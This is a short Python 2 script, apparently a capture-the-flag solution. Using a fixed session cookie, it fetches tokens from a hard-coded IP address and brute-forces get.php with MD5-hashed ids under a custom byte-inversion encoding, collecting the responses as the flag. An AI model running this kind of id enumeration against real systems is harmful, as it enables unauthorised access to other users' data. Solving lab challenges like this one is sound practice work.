import requests
import hashlib
def encode(str):
    end = ""
    for s in str:
        if ord(s)<128:
            end+="%x"%(255-(ord(s)+128))
        if ord(s)>127:
            end+="%x"%(255-(ord(s)-128))
    return end
flag = []
for x in range(0,200):
    cookies = {'PHPSESSID': '3k2rd4536me3rjsojf473vctd7'}
    r = requests.get("http://117.34.111.15:81/token.php",cookies=cookies)
    m = hashlib.md5(str(x)).hexdigest()
    print x
    print "http://117.34.111.15:81/get.php?token="+r.text[1:-1]+"&id="+encode(m)
    s = requests.get("http://117.34.111.15:81/get.php?token="+r.text[1:-1]+"&id="+encode(m),cookies=cookies)
    flag.append(s.text)
    print s.text
print set(flag)
